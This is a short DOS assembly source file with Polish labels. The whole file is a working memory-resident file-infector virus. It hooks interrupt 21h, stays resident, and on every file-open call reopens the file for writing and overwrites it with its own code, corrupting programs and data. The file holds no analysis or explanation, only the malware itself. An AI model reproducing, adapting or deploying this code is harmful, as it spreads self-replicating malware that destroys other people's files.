format binary

P21H_PLIK_OTWORZ equ 3dh
P21H_PLIK_ZAPISZ equ 40h
P21H_P_TRYB_ODCZYT_ZAPIS equ 2h
P21H_PRZERWANIE_PROCEDURA_POBIERZ equ 35h
P21H_PRZERWANIE_PROCEDURA_PODMIEN equ 25h

org 100h

start:
  mov ax, ((P21H_PRZERWANIE_PROCEDURA_POBIERZ shl 8) or 21h)
  int 21h
  mov word [przerwanie_21h_adres], bx
  mov word [przerwanie_21h_adres + 2h], es
  mov ah, P21H_PRZERWANIE_PROCEDURA_PODMIEN
  mov dx, przerwanie_21h_obsluga
  int 21h
  mov dx, koniec
  int 27h
  
przerwanie_21h_obsluga:
  cmp ah, P21H_PLIK_OTWORZ
  je zarazenie
  db 0eah
przerwanie_21h_adres:
  dd ?
zarazenie:
  pushf
  mov al, P21H_P_TRYB_ODCZYT_ZAPIS
  call dword [cs:przerwanie_21h_adres]
  pusha
  push ds
  push cs
  pop ds
  xchg bx, ax
  mov ah, P21H_PLIK_ZAPISZ
  mov cx, koniec - start
  mov dx, 100h
  int 21h
  pop ds
  popa
  retf 2h

koniec:
